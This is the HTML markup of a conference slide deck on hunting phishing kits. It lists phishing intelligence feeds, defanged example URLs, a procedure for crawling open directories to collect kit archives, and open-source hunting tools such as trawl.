+<div class="sl-block" data-block-type="image" data-block-id="5336dbe9072bedf0cf062ecdd7a22807" style="min-width: 4px; min-height: 4px; width: 767px; height: 1080px; left: 1153px; top: 0px;"><div class="sl-block-content" style="z-index: 13;"><img data-natural-width="959" data-natural-height="1350" style="" data-lazy-loaded="" data-src="hunting-for-phishkits/aea5e8e6c1c5fa9bee146698c48fbcf7.png"></div></div>
+<div class="sl-block" data-block-type="image" data-block-id="2509f197aee4cab1b6d4cf193c2a7a3c" style="min-width: 4px; min-height: 4px; width: 829px; height: 1080px; left: 546px; top: 0px;"><div class="sl-block-content" style="z-index: 12;"><img data-natural-width="1036" data-natural-height="1350" style="" data-lazy-loaded="" data-src="hunting-for-phishkits/49fd151cde2711366247311c4c7054ef.png"></div></div></section><section data-id="47a0f20217bad1483a8fbfa3374296e0"><div class="sl-block" data-block-type="text" style="width: 860px; left: 942px; top: 47px; height: auto;" data-block-id="3bae8ed052be36a9fe25e49879aec791"><div class="sl-block-content" data-placeholder-tag="h2" data-placeholder-text="Title Text" style="z-index: 11;">
+<h2>card validation</h2>
+</div></div>
+<div class="sl-block" data-block-type="image" style="width: 810px; height: 1080px; left: 0px; top: 0px; min-width: 4px; min-height: 4px;" data-block-id="bf189b2d35183ace0848a19658abf365"><div class="sl-block-content" style="z-index: 12;"><img data-natural-width="1012" data-natural-height="1350" style="" data-lazy-loaded="" data-src="hunting-for-phishkits/cac549ce9334a6f70a23af390dd3549b.png"></div></div>
+<div class="sl-block" data-block-type="image" data-block-id="cf00970e99bd9ad0e451f7fc05350c39" style="min-width: 4px; min-height: 4px; width: 1083px; height: 381px; left: 837px; top: 350px;"><div class="sl-block-content" style="z-index: 13;"><img data-natural-width="2500" data-natural-height="591" style="left: 0px; top: 0px; width: 1612px; height: 381px;" data-crop-x="0" data-crop-y="0" data-crop-width="0.671654" data-crop-height="1" data-lazy-loaded="" data-src="hunting-for-phishkits/6d644a25500754e9b027ffe3c26d6048.png"></div></div></section><section data-id="3c3425d2b8043fbc9fa416e6dad6f2f7"><div class="sl-block" data-block-type="image" data-block-id="657d4a89f9f16f8f522d2d59d3db0d9c" style="min-width: 4px; min-height: 4px; width: 885px; height: 1080px; left: 0px; top: 0px;"><div class="sl-block-content" style="z-index: 10;"><img style="" data-natural-width="1106" data-natural-height="1350" data-lazy-loaded="" data-src="hunting-for-phishkits/2425c174c34c2b3311db30abbbe0a301.png"></div></div>
+<div class="sl-block" data-block-type="image" data-block-id="6ec48cef19469811e983c53f39702fed" style="min-width: 4px; min-height: 4px; width: 309px; height: 309px; left: 326px; top: 134px;"><div class="sl-block-content" style="z-index: 12;"><img data-natural-width="309" data-natural-height="309" style="" data-lazy-loaded="" data-src="hunting-for-phishkits/23a19e0eea35f1de93a7d02be20206e6.png"></div></div>
+<div class="sl-block" data-block-type="image" data-block-id="da1630a6f3e835073d9802a25f501900" style="min-width: 4px; min-height: 4px; width: 616px; height: 475px; left: 1132px; top: 303px;"><div class="sl-block-content" style="z-index: 13;"><img data-natural-width="432" data-natural-height="333" style="" data-lazy-loaded="" data-src="hunting-for-phishkits/6396de000a9bcde1b0ac2813ead37c9a.jpg"></div></div>
+<div class="sl-block" data-block-type="text" style="width: 860px; left: 942px; top: 47px; height: auto;" data-block-id="f9bcd201e0d26d9a18a62378bff3b54a"><div class="sl-block-content" data-placeholder-tag="h2" data-placeholder-text="Title Text" style="z-index: 14;">
+<h2>logs!</h2>
+</div></div></section><section data-id="87c7517db019fe2dadc10f724c65f606"><div class="sl-block" data-block-type="image" style="width: 1920px; height: 1008px; left: 0px; top: 36px; min-width: 4px; min-height: 4px;" data-block-id="36eaa68477600f546075a54243a76a31"><div class="sl-block-content" style="z-index: 11;"><img data-natural-width="2500" data-natural-height="1312" style="" data-lazy-loaded="" data-src="hunting-for-phishkits/fce2ee755634ea343a631567d25f31af.png"></div></div></section><section data-id="2f6f006d05deb877d4b458252b249ed5">
+<div class="sl-block" data-block-type="image" data-block-id="06649ceeddfea4118e1c68241c580fac" style="min-width: 4px; min-height: 4px; width: 732px; height: 748px; left: 114px; top: -6px;"><div class="sl-block-content" style="z-index: 11;"><img style="" data-natural-width="1321" data-natural-height="1350" data-lazy-loaded="" data-src="hunting-for-phishkits/e4092afc76674fef089914fae95b6ff3.png"></div></div>
+<div class="sl-block" data-block-type="image" data-block-id="f62d1672d43ba06989d639209249082f" style="min-width: 4px; min-height: 4px; width: 780px; height: 318px; left: 90px; top: 762px;"><div class="sl-block-content" style="z-index: 12;"><img data-natural-width="780" data-natural-height="318" style="" data-lazy-loaded="" data-src="hunting-for-phishkits/a8eafa024eee93ca5c81da0c919dc6c1.png"></div></div>
+<div class="sl-block" data-block-type="image" data-block-id="8fad6d81471f0dbce88fb2c52a9ef2ac" style="min-width: 4px; min-height: 4px; width: 776px; height: 523px; left: 973px; top: 17px;"><div class="sl-block-content" style="z-index: 13;"><img data-natural-width="1092" data-natural-height="736" style="" data-lazy-loaded="" data-src="hunting-for-phishkits/2687396332d2216d05103f5a8084e700.png"></div></div>
+<div class="sl-block" data-block-type="image" data-block-id="803cc159d2fba5b4fab2753833072c2e" style="min-width: 4px; min-height: 4px; width: 693px; height: 489px; left: 1014px; top: 563px;"><div class="sl-block-content" style="z-index: 14;"><img data-natural-width="762" data-natural-height="538" style="" data-lazy-loaded="" data-src="hunting-for-phishkits/3d9eda620ca2cf9f1eb959cd7dacc8b2.png"></div></div></section><section data-id="315374b31358f6bd6d2b875174ef0965"><div class="sl-block" data-block-type="text" style="width: 413px; left: 8px; top: 72px; height: auto;" data-block-id="5a9cefcd4bc5f92a4faef1faec9fd25d"><div class="sl-block-content" data-placeholder-tag="h2" data-placeholder-text="Title Text" style="text-align: left; z-index: 11;">
+<h2>Warez Kits</h2>
+</div></div>
+<div class="sl-block" data-block-type="text" style="width: 413px; left: 8px; top: 146px; height: auto;" data-block-id="30af5375cefe03beb3e8f2eec90af096"><div class="sl-block-content" data-placeholder-tag="p" data-placeholder-text="Lorem ipsum dolor sit amet, consectetur adipiscing elit. Morbi nec metus justo. Aliquam erat volutpat." style="z-index: 13; text-align: left;">
+<ul>
+	<li>Lots of goodies found here</li>
+</ul>
+
+<p> </p>
+
+<ul>
+	<li>PowerShell</li>
+	<li>EXEs</li>
+	<li>MSIs</li>
+	<li>DLLs</li>
+	<li>BINs</li>
+	<li>PDFs</li>
+	<li>DOCXs</li>
+	<li>LNKs</li>
+	<li>APKs</li>
+</ul>
+</div></div>
+<div class="sl-block" data-block-type="image" style="width: 709px; height: 1080px; left: 1211px; top: 0px; min-width: 4px; min-height: 4px;" data-block-id="8486976bc748e7ea46572ee7c212d5aa"><div class="sl-block-style" style="z-index: 12; transform: rotate(360deg);"><div class="sl-block-content" style="z-index: 12;"><img style="" data-natural-width="886" data-natural-height="1350" data-lazy-loaded="" data-src="hunting-for-phishkits/192cc7bab4d9846fecfa8bb55ba6a63f.png"></div></div></div>
+<div class="sl-block" data-block-type="image" data-block-id="94f0de0910f44c2e89efb7b5539cb353" style="min-width: 4px; min-height: 4px; width: 593px; height: 382px; left: 591px; top: 10px;"><div class="sl-block-content" style="z-index: 14;"><img data-natural-width="593" data-natural-height="382" style="" data-lazy-loaded="" data-src="hunting-for-phishkits/7a15b36fb24aecd2336874bf2859eb0f.png"></div></div>
+<div class="sl-block" data-block-type="image" data-block-id="b110395e4f8ade0b71ed287c7951f9ea" style="min-width: 4px; min-height: 4px; width: 995px; height: 615px; left: 205px; top: 465px;"><div class="sl-block-content" style="z-index: 15;"><img style="" data-natural-width="710" data-natural-height="439" data-lazy-loaded="" data-src="hunting-for-phishkits/ca4a51196ebff8ac61d93fd135d06f38.png"></div></div></section></section><section class="stack" data-id="02857afea954ec679a5dda837e79c10d"><section data-id="4ec18366ee11dd8ebde08e6809de6c26"><div class="sl-block" data-block-type="text" style="width: 806px; left: 557px; top: 232px; height: auto;" data-block-id="479eceab21dc109fefffad90b374a3cd"><div class="sl-block-content" data-placeholder-tag="h2" data-placeholder-text="Title Text" style="z-index: 11;">
+<h2>BENIES</h2>
+</div></div>
+<div class="sl-block" data-block-type="image" data-block-id="5f2cd8e10486b93ef7903a854cadc5cc" style="min-width: 4px; min-height: 4px; width: 1616px; height: 1077px; left: 152px; top: 2px;"><div class="sl-block-content" style="z-index: 12;"><img data-natural-width="1286" data-natural-height="857" style="" data-lazy-loaded="" data-src="hunting-for-phishkits/37e573a11c7baaf987c2de4cbadb9fde.jpg"></div></div></section><section data-id="49b5b71c0970d70088604ebec9ca9dac"><div class="sl-block" data-block-type="image" data-block-id="9bc2bc30748b346a917d4aeb9b63e684" style="min-width: 4px; min-height: 4px; width: 1624px; height: 1080px; left: 148px; top: 0px;"><div class="sl-block-content" style="z-index: 11;"><img style="" data-natural-width="600" data-natural-height="399" data-lazy-loaded="" data-src="hunting-for-phishkits/aa2a1e3b360e237b5ae3ab16008e7925.gif"></div></div></section><section data-id="912777a415f0e5c53e94d99c914c265f"><div class="sl-block" data-block-type="text" style="width: 569px; left: 8px; top: 72px; height: auto;" data-block-id="6c184d283691abca76d02b7e888c2b0c"><div class="sl-block-content" data-placeholder-tag="h2" data-placeholder-text="Title Text" style="text-align: left; z-index: 11;">
+<h2>ioc's are not dead</h2>
+</div></div>
+<div class="sl-block" data-block-type="text" style="width: 483px; left: 16px; top: 165px; height: auto;" data-block-id="143832be16082689248348defd2e1e08"><div class="sl-block-content" data-placeholder-tag="p" data-placeholder-text="Lorem ipsum dolor sit amet, consectetur adipiscing elit. Morbi nec metus justo. Aliquam erat volutpat." style="z-index: 13; text-align: left;">
+<ul>
+	<li>IOC's are still valuable for active defense but TTPs are better for long-term defensive measures</li>
+</ul>
+
+<p> </p>
+
+<ul>
+	<li>
+	<p>PhishKit Names &amp; Versions</p>
+	</li>
+	<li>
+	<p>Email Addresses being used to forward captured content</p>
+	</li>
+	<li>
+	<p>Logs</p>
+	</li>
+	<li>
+	<p>Specific hosting providers</p>
+
+	<ul>
+		<li>
+		<p>WHOIS/RDAP info</p>
+		</li>
+	</ul>
+	</li>
+	<li>
+	<p>Additionally, if you continue to see a phishkit variant over and over you can track their defensive measures - this also helps to improve your own tooling</p>
+	</li>
+</ul>
+</div></div>
+<div class="sl-block" data-block-type="image" style="width: 640px; height: 1080px; left: 1280px; top: 0px; min-width: 4px; min-height: 4px;" data-block-id="a0a164f52615148346d96a1f68d00b8e"><div class="sl-block-content" style="z-index: 12;"><img style="left: 0px; top: 0px; width: 864px; height: 1080px;" data-natural-width="1080" data-natural-height="1350" data-crop-x="0" data-crop-y="0" data-crop-width="0.741071" data-crop-height="1" data-lazy-loaded="" data-src="hunting-for-phishkits/6bd5f629e247a5297d8602fa571119e0.png"></div></div>
+<div class="sl-block" data-block-type="image" data-block-id="3917b86bc4f04eaa553a780bfa776bac" style="min-width: 4px; min-height: 4px; width: 735px; height: 596px; left: 545px; top: 0px;"><div class="sl-block-content" style="z-index: 14;"><img data-natural-width="1292" data-natural-height="1048" style="" data-lazy-loaded="" data-src="hunting-for-phishkits/65bbd6483ec76fae2d863bf60d32691d.png"></div></div>
+<div class="sl-block" data-block-type="image" style="width: 733px; height: 494px; left: 547px; top: 586px; min-width: 4px; min-height: 4px;" data-block-id="38b9906403001a2c5e1ec50ac91e89d7"><div class="sl-block-content" style="z-index: 16;"><img style="" data-natural-width="1092" data-natural-height="736" data-lazy-loaded="" data-src="hunting-for-phishkits/2687396332d2216d05103f5a8084e700.png"></div></div></section></section><section class="stack" data-id="e8aa54439feb6744c6c3961ef1111568"><section data-id="8e858b5ea0eb90f1f51074c1933b090e"><div class="sl-block" data-block-type="text" style="width: 806px; left: 597px; top: 0px; height: auto;" data-block-id="8c2f54f038dbd826b6bded92279c35cf"><div class="sl-block-content" data-placeholder-tag="h2" data-placeholder-text="Title Text" style="z-index: 10;">
+<h2>catchin kitz</h2>
+</div></div>
+<div class="sl-block" data-block-type="image" style="width: 1521px; height: 945px; left: 239px; top: 104px; min-width: 4px; min-height: 4px;" data-block-id="371af179cf7f09578b1b1831585a8e8b"><div class="sl-block-content" style="z-index: 11;"><img data-natural-width="470" data-natural-height="292" style="" data-lazy-loaded="" data-src="hunting-for-phishkits/1b12e6b6834d715610ede4bedf2a6949.gif"></div></div></section><section data-id="39f70ef9d589e816da023537259fda54"><div class="sl-block" data-block-type="image" data-block-id="38397327aaf17530287c7181ffdbce77" style="min-width: 4px; min-height: 4px; width: 1288px; height: 1073px; left: 312px; top: 0px;"><div class="sl-block-content" style="z-index: 11;"><img data-natural-width="1000" data-natural-height="833" style="" data-src="hunting-for-phishkits/00f082f2b1e83f6cf38eddb2fa0c61ca.jpeg"></div></div></section><section data-id="1f81e06aefd5c1305d0087d7fe99e9fc"><div class="sl-block" data-block-type="text" style="width: 1612px; left: 154px; top: 65px; height: auto;" data-block-id="40c2e1bd9dd599600120ebe442ba4c06"><div class="sl-block-content" data-placeholder-tag="h2" data-placeholder-text="Title Text" style="z-index: 10;">
+<h2>simplified phishing response workflow</h2>
+</div></div>
+<div class="sl-block" data-block-type="image" style="width: 1920px; height: 905px; left: 0px; top: 153px; min-width: 4px; min-height: 4px;" data-block-id="4da92439d9552dc12940e2e76c01371d"><div class="sl-block-content" style="z-index: 11;"><img data-natural-width="1211" data-natural-height="571" style="" data-lazy-loaded="" data-src="hunting-for-phishkits/97c030c1e0f9a6584d85ea9cc1124c26.png"></div></div></section><section data-id="c884d131f8dc2c2e727dddd2ac05c40a"><div class="sl-block" data-block-type="image" style="width: 1789px; height: 1021px; left: 66px; top: 59px; min-width: 4px; min-height: 4px;" data-block-id="8affbdbd299d686e511a4d4c5061cd32"><div class="sl-block-content" style="z-index: 11;"><img data-natural-width="1211" data-natural-height="691" style="" data-lazy-loaded="" data-src="hunting-for-phishkits/09a5a18588b18d6d816b2b5bb09c92fa.png"></div></div>
+<div class="sl-block" data-block-type="text" style="width: 1612px; left: 154px; top: 65px; height: auto;" data-block-id="de1185725465900f5d7fbba83b667b57"><div class="sl-block-content" data-placeholder-tag="h2" data-placeholder-text="Title Text" style="z-index: 12;">
+<h2>simplified phishing response workflow</h2>
+</div></div></section><section data-id="b4438e0a4db19a247e8eabbac72972fa"><div class="sl-block" data-block-type="text" style="width: 1612px; left: 160px; top: 24px; height: auto;" data-block-id="6d11132aee5f956fe99fca97ca080e16"><div class="sl-block-content" data-placeholder-tag="h2" data-placeholder-text="Title Text" style="z-index: 10;">
+<h1>pre-filtered sources</h1>
+</div></div>
+<div class="sl-block" data-block-type="text" style="width: 1600px; left: 160px; top: 144px; height: auto;" data-block-id="3dadae5cd2221d44473a19a101f4e00e"><div class="sl-block-content" data-placeholder-tag="p" data-placeholder-text="Text" style="z-index: 12;">
+<ul>
+	<li><span style="font-size:1.6em">OpenPhish.com</span></li>
+	<li><span style="font-size:1.6em">PhishTank.com</span></li>
+	<li><span style="font-size:1.6em"><a href="https://github.com/mitchellkrogza/Phishing.Database" target="_blank">https://github.com/mitchellkrogza/Phishing.Database</a></span></li>
+	<li><span style="font-size:1.6em">UrlScan.io</span></li>
+	<li><span style="font-size:1.6em">Twitter!</span></li>
+</ul>
+</div></div>
+<div class="sl-block" data-block-type="text" style="width: 1600px; left: 160px; top: 578px; height: auto;" data-block-id="33181930b023e2a966bb0f486753040c"><div class="sl-block-content" data-placeholder-tag="h2" data-placeholder-text="Title Text" style="z-index: 14;">
+<h1>raw sources</h1>
+</div></div>
+<div class="sl-block" data-block-type="text" style="width: 1600px; left: 160px; top: 698px; height: auto;" data-block-id="c20d9bd116f38878b1cc2a79cd580c34"><div class="sl-block-content" data-placeholder-tag="p" data-placeholder-text="Text" style="z-index: 15;">
+<ul>
+	<li><span style="font-size:1.6em">Certificate Transparency Logs - <a href="https://certstream.calidog.io/" target="_blank">https://certstream.calidog.io</a></span></li>
+	<li><span style="font-size:1.6em">WHOIS Domain Search - <a href="https://whoisds.com/" target="_blank">https://whoisds.com/</a></span></li>
+	<li><span style="font-size:1.6em">Dumpster Fire - <a href="https://pastebin.com/" target="_blank">https://pastebin.com/</a></span></li>
+	<li><span style="font-size:1.6em">WebAnalyzer (WHOIS new Domains) - <a href="https://wa-com.com/" target="_blank">https://wa-com.com</a></span></li>
+	<li><span style="font-size:1.6em">FireHOL IP Blocklists - <a href="http://iplists.firehol.org/" target="_blank">http://iplists.firehol.org/</a></span></li>
+</ul>
+</div></div></section><section data-id="a105a49ddb7e05f69d3e904bcb7100b0"><div class="sl-block" data-block-type="image" data-block-id="8906992c94e70397f57f05dd2c9242cd" style="min-width: 4px; min-height: 4px; width: 589px; height: 174px; left: 629px; top: 633px;"><div class="sl-block-content" style="z-index: 11;"><img data-natural-width="589" data-natural-height="174" style="" data-lazy-loaded="" data-src="hunting-for-phishkits/b9d22884a9ab49143f98257caf98073c.png"></div></div>
+<div class="sl-block" data-block-type="image" data-block-id="392efe0e5388989b83caaae81ec55aa1" style="min-width: 4px; min-height: 4px; width: 588px; height: 565px; left: 630px; top: 6px;"><div class="sl-block-content" style="z-index: 12;"><img data-natural-width="588" data-natural-height="565" style="" data-lazy-loaded="" data-src="hunting-for-phishkits/0b20f1556e127c2afe8ecdd53233385d.png"></div></div>
+<div class="sl-block" data-block-type="image" data-block-id="041030670cc5762d3ae4ea26ac65ac62" style="min-width: 4px; min-height: 4px; width: 690px; height: 542px; left: 1230px; top: 530px;"><div class="sl-block-content" style="z-index: 13;"><img style="" data-natural-width="584" data-natural-height="459" data-lazy-loaded="" data-src="hunting-for-phishkits/ff63db1473967b198b5042ce5f9e66cb.png"></div></div>
+<div class="sl-block" data-block-type="image" data-block-id="5447f1f6e23315a602ec6b670820a7c7" style="min-width: 4px; min-height: 4px; width: 654px; height: 523px; left: 1248px; top: 0px;"><div class="sl-block-content" style="z-index: 14;"><img data-natural-width="588" data-natural-height="470" style="" data-lazy-loaded="" data-src="hunting-for-phishkits/12e86c2ae1f74b7c1ba3e81c0d6bf2b0.png"></div></div>
+<div class="sl-block" data-block-type="image" data-block-id="373655158ad1a67a3b6ca63ab26ba490" style="min-width: 4px; min-height: 4px; width: 586px; height: 466px; left: 17px; top: 6px;"><div class="sl-block-content" style="z-index: 15;"><img data-natural-width="586" data-natural-height="466" style="" data-lazy-loaded="" data-src="hunting-for-phishkits/7885de2daf4ce68f8da0f3be02b32c43.png"></div></div>
+<div class="sl-block" data-block-type="image" data-block-id="af0ab8918382d47cc5d69686591701da" style="min-width: 4px; min-height: 4px; width: 588px; height: 565px; left: 17px; top: 495px;"><div class="sl-block-content" style="z-index: 16;"><img style="" data-natural-width="588" data-natural-height="565" data-lazy-loaded="" data-src="hunting-for-phishkits/2b4c1776c75a38364793c850109fe752.png"></div></div>
+<div class="sl-block" data-block-type="image" data-block-id="ff85b537e2b68db9da34526cc0b0a021" style="min-width: 4px; min-height: 4px; width: 580px; height: 172px; left: 634px; top: 873px;"><div class="sl-block-content" style="z-index: 17;"><img data-natural-width="580" data-natural-height="172" style="" data-lazy-loaded="" data-src="hunting-for-phishkits/6a5a0438c01818eb4f049f0bf24143df.png"></div></div></section><section data-id="a15b830507896039dbb7ea2eab9fa63f"><div class="sl-block" data-block-type="text" style="width: 1920px; left: 0px; top: 139px; height: auto;" data-block-id="1ade9dafd7e251e217dd8c8226efe098"><div class="sl-block-content" data-placeholder-tag="h1" data-placeholder-text="Title Text" style="z-index: 10;">
+<h1><span style="font-size:2.0em">#opendir || opendir</span></h1>
+
+<h1><span style="font-size:2.0em">#phishkit || phishkit</span></h1>
+
+<h1 style="text-align: left;"><span style="font-size:2.0em">#phishingkit ||phishingkit</span></h1>
+</div></div></section><section data-id="7f15005b66e8521de88d0ab3f2639f06"><div class="sl-block" data-block-type="image" style="width: 1169px; height: 968px; left: 456px; top: 84px; min-width: 4px; min-height: 4px;" data-block-id="8e3baa2c3a76fb5bd26681474305fde1"><div class="sl-block-content" style="z-index: 10;"><img style="" data-natural-width="814" data-natural-height="674" data-lazy-loaded="" data-src="hunting-for-phishkits/8c8ce297cec269346c4a833730dae8d7.png"></div></div>
+<div class="sl-block" data-block-type="text" style="width: 806px; left: 546px; top: 0px; height: auto;" data-block-id="962eb5303a3bbc4f1aec14df29e7df8d"><div class="sl-block-content" data-placeholder-tag="h2" data-placeholder-text="Title Text" style="z-index: 11;">
+<h2>#opendir</h2>
+</div></div></section><section data-id="c6ed936f58a754a1839ae078d3036753"><div class="sl-block" data-block-type="text" style="width: 1612px; left: 154px; top: 72px; height: auto;" data-block-id="3911f361ab7037c39baef4635ab2929b"><div class="sl-block-content" data-placeholder-tag="h1" data-placeholder-text="Title Text" style="z-index: 10;">
+<h1>/some[.]domain[.]com/phish/path</h1>
+
+<h1>some.domain[.com//phish//path</h1>
+
+<h1>hxxps://some.domain[.]com/phish/path</h1>
+
+<h1>hXXp://some.domain.com/</h1>
+</div></div>
+<div class="sl-block" data-block-type="text" style="width: 1612px; left: 148px; top: 901px; height: auto;" data-block-id="6de1d429b1d878ff58da65c2a7c666dc"><div class="sl-block-content" data-placeholder-tag="h2" data-placeholder-text="Subtitle" style="z-index: 11;">
+<h1>http://some.domain.com/</h1>
+</div></div></section><section data-id="1a56e4e0410ef6173a994c7ebd7ed4d3"><div class="sl-block" data-block-type="image" data-block-id="bacea345727c19c4f0f789a1b9ed8964" style="min-width: 4px; min-height: 4px; width: 1918px; height: 1080px; left: 2px; top: 0px;"><div class="sl-block-content" style="z-index: 11;"><img data-natural-width="2023" data-natural-height="1139" style="" data-lazy-loaded="" data-src="hunting-for-phishkits/5ea66332ce94ce27ab5555b16c4673a6.png"></div></div></section><section data-id="b93cda9e19b4579588f7ccca88a77170"><div class="sl-block" data-block-type="text" style="width: 825px; left: 58px; top: 130px; height: auto;" data-block-id="b0942f9f3b0e8590561eaed495ba6920"><div class="sl-block-content" data-placeholder-tag="h2" data-placeholder-text="Title Text" style="text-align: left; z-index: 10;">
+<h2>finding &amp; generating paths</h2>
+</div></div>
+<div class="sl-block" data-block-type="text" style="width: 825px; left: 58px; top: 204px; height: auto;" data-block-id="9f9164f72b510752057bd1afdf3323e3"><div class="sl-block-content" data-placeholder-tag="p" data-placeholder-text="Lorem ipsum dolor sit amet, consectetur adipiscing elit. Morbi nec metus justo. Aliquam erat volutpat." style="z-index: 12; text-align: left;">
+<ol>
+	<li>Identify the root of the site</li>
+	<li>Download content</li>
+	<li>Check if title of page contains "Index Of"
+	<ol>
+		<li>Parse all &lt;a&gt; &amp; &lt;href&gt; tags for files and folders</li>
+		<li>Add files to file list (add to master list)</li>
+		<li>Add folders to original URL path (add to master list)</li>
+		<li>Repeat</li>
+	</ol>
+	</li>
+	<li>Each folder in path (path list) is parsed and a .zip is appended
+	<ol>
+		<li>Add to master list</li>
+	</ol>
+	</li>
+	<li>Attempt to download all files (based on extension preference) in master list</li>
+	<li>Profit?</li>
+</ol>
+</div></div>
+<div class="sl-block" data-block-type="image" style="width: 871px; height: 1080px; left: 1049px; top: 0px; min-width: 4px; min-height: 4px;" data-block-id="ccda4cd061c7f5de8ccaf43176089c6f"><div class="sl-block-content" style="z-index: 11;"><img data-natural-width="996" data-natural-height="1235" style="" data-lazy-loaded="" data-src="hunting-for-phishkits/9487d682f163ef68a348e7a9eb41acc9.gif"></div></div></section></section><section class="stack" data-id="a2b255eee5c870066f3de9612d7f9bb3"><section data-id="ee0d6dfd9fef86a2f2d8b57c4d3b927d"><div class="sl-block" data-block-type="text" style="width: 1612px; left: 154px; top: 65px; height: auto;" data-block-id="900307cdf17b3a0a0ec845794707213b"><div class="sl-block-content" data-placeholder-tag="h2" data-placeholder-text="Title Text" style="z-index: 10;"><h2>Title Text</h2></div></div>
+<div class="sl-block" data-block-type="image" style="width: 1508px; height: 1080px; left: 206px; top: 0px; min-width: 4px; min-height: 4px;" data-block-id="c2ccfcf65278d94210b7ddea13ff0fa0"><div class="sl-block-content" style="z-index: 11;"><img data-natural-width="990" data-natural-height="709" style="" data-lazy-loaded="" data-src="hunting-for-phishkits/b251c71de718946588b8fee27bb46140.gif"></div></div></section><section data-id="55fb1c56c582db73c48eee66bb29862c"><div class="sl-block" data-block-type="text" style="width: 825px; left: 58px; top: 130px; height: auto;" data-block-id="f42a1099c33f7621fd0e32ae0cdc4fd4"><div class="sl-block-content" data-placeholder-tag="h2" data-placeholder-text="Title Text" style="text-align: left; z-index: 11;">
+<h2>open-source tools</h2>
+</div></div>
+<div class="sl-block" data-block-type="text" style="width: 825px; left: 58px; top: 338px; height: auto;" data-block-id="40f81dff71e5d4e2e15927a7a28d5fac"><div class="sl-block-content" data-placeholder-tag="p" data-placeholder-text="Lorem ipsum dolor sit amet, consectetur adipiscing elit. Morbi nec metus justo. Aliquam erat volutpat." style="z-index: 12; text-align: left;">
+<ul>
+	<li><span style="font-size:1.4em"><a href="https://github.com/x0rz/phishing_catcher" target="_blank">https://github.com/x0rz/phishing_catcher</a></span></li>
+	<li><span style="font-size:1.4em"><a href="https://github.com/t4d/PhishingKitHunter" target="_blank">https://github.com/t4d/PhishingKitHunter</a></span></li>
+	<li><span style="font-size:1.4em"><a href="https://github.com/t4d/StalkPhish" target="_blank">https://github.com/t4d/StalkPhish</a></span></li>
+	<li><span style="font-size:1.4em"><a href="https://github.com/duo-labs/phish-collect" target="_blank">https://github.com/duo-labs/phish-collect</a></span></li>
+	<li><span style="font-size:1.4em"><a href="https://github.com/ninoseki/miteru" target="_blank">https://github.com/ninoseki/miteru</a></span></li>
+	<li><span style="font-size:1.4em"><a href="https://github.com/cybercdh/phishfinder" target="_blank">https://github.com/cybercdh/phishfinder</a></span></li>
+	<li><span style="font-size:1.4em">Plus tons of others</span></li>
+</ul>
+</div></div>
+<div class="sl-block" data-block-type="image" data-block-id="527857882b631477e4307a86e35e5f31" style="min-width: 4px; min-height: 4px; width: 606px; height: 1080px; left: 1314px; top: 0px;"><div class="sl-block-content" style="z-index: 13;"><img style="" data-natural-width="404" data-natural-height="720" data-lazy-loaded="" data-src="hunting-for-phishkits/922e8180d34b7b20207f4ee82d4751a6.gif"></div></div></section><section data-id="a2ebcf55241558e9611f4b5fa6549e4c"><div class="sl-block" data-block-type="image" data-block-id="db8db7fc3444c02aac2a1d25a5946548" style="min-width: 4px; min-height: 4px; width: 1734px; height: 989px; left: 93px; top: 91px;"><div class="sl-block-content" style="z-index: 10;"><img data-natural-width="1680" data-natural-height="1261" style="left: -1px; top: -130px; width: 1735px; height: 1302px;" data-crop-x="0.000526" data-crop-y="0.100073" data-crop-width="0.999474" data-crop-height="0.759576" data-lazy-loaded="" data-src="hunting-for-phishkits/0b7a46f66e919d54f4b03b7ddc8841e7.png"></div></div>
+<div class="sl-block" data-block-type="text" style="width: 1612px; left: 154px; top: 0px; height: auto;" data-block-id="3fb1ceeb603f8f8fbeb1778d3a748da2"><div class="sl-block-content" data-placeholder-tag="h2" data-placeholder-text="Title Text" style="z-index: 12;">
+<h2><a href="https://github.com/swimlane/trawl" target="_blank">https://github.com/swimlane/trawl</a></h2>
+</div></div></section></section><section data-id="6d60e5d9cc0f4388c5e6928c65986754"><div class="sl-block" data-block-type="text" style="width: 1612px; left: 148px; top: 72px; height: auto;" data-block-id="5fccc675999c1da46b5953decc43fb2c"><div class="sl-block-content" data-placeholder-tag="h1" data-placeholder-text="Title Text" style="z-index: 10;">
+<h1><strong>kthxbye</strong></h1>
+</div></div>
+<div class="sl-block" data-block-type="text" style="width: 1612px; left: 68px; top: 227px; height: auto;" data-block-id="0e5752707429c4444cc8b79e931abda6"><div class="sl-block-content" data-placeholder-tag="h2" data-placeholder-text="Subtitle" style="z-index: 11;">
+<p style="text-align:left"><span style="font-size:2.0em">twitter: <strong>@MSAdministrator</strong></span></p>
+
+<p style="text-align:left"><span style="font-size:2.0em">github: <strong>https://github.com/MSAdministrator</strong></span></p>
+
+<p style="text-align:left"><span style="font-size:2.0em">p-blog: <strong>https://letsautomate.it</strong></span></p>
+
+<p style="text-align:left"><span style="font-size:2.0em">w-blog: <strong>https://swimlane.com/blog</strong></span></p>
+
+<p style="text-align:left"> </p>
+
+<p style="text-align:left"> </p>
+
+<p style="text-align:left"> </p>
+
+<p style="text-align:left"> </p>
+
+<p style="text-align:left"> </p>
+
+<p style="text-align:left"> </p>
+
+<p style="text-align:left"><span style="font-size:2.0em">trawl: <strong>https://github.com/swimlane/trawl</strong></span></p>
+
+<p style="text-align:left"><span style="font-size:2.0em">slides: <strong><span style="font-size:0.7em">https://letsautomate.it/presentations/hunting-for-phishkits.html#/</span></strong></span></p>
+
+<p style="text-align:left">                         (slides will be up sometime this week/end)</p>
+</div></div></section>
+			</div>
+		</div>
+
+		<script>
+			var SLConfig = {"deck": {"id":1593510,"slug":"h-3","title":"Copy of Hunting Phish Kits","description":"","width":1920,"height":1080,"visibility":"all","published_at":"2019-09-07T18:40:59.161Z","sanitize_messages":null,"thumbnail_url":"https://s3.amazonaws.com/media-p.slid.es/thumbnails/2d1a885e49a7b38af5aafbaabbc55834/thumb.jpg?1567557272","view_count":0,"user":{"id":751485,"username":"msadministrator","name":null,"description":null,"thumbnail_url":"https://www.gravatar.com/avatar/a3cab24cca7ccf6c969a9161fa1405ef?s=140\u0026d=https%3A%2F%2Fstatic.slid.es%2Fimages%2Fdefault-profile-picture.png","paid":true,"pro":false,"lite":true,"team_id":null,"settings":{"id":601912,"present_controls":true,"present_upsizing":true,"present_pointer":false,"present_notes":true,"default_deck_tag_id":null}},"background_transition":"slide","transition":"slide","theme_id":null,"theme_font":"montserrat","theme_color":"white-blue","auto_slide_interval":0,"comments_enabled":true,"forking_enabled":true,"rolling_links":false,"center":false,"shuffle":false,"should_loop":false,"share_notes":false,"slide_number":false,"slide_count":46,"rtl":false,"version":2,"collaborative":false,"deck_user_editor_limit":1,"data_updated_at":1567